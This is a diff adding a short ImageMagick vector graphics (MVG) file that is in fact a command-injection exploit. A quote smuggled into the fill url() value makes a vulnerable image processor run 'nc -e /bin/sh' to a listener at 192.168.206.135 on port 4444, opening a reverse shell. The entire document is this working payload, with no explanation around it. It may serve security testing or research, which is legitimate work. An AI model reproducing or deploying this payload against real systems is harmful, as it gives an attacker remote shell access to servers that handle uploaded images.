@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://192.168.206.135/someimage.jpg"|nc -e /bin/sh 192.168.206.135 "4444)'
+pop graphic-context
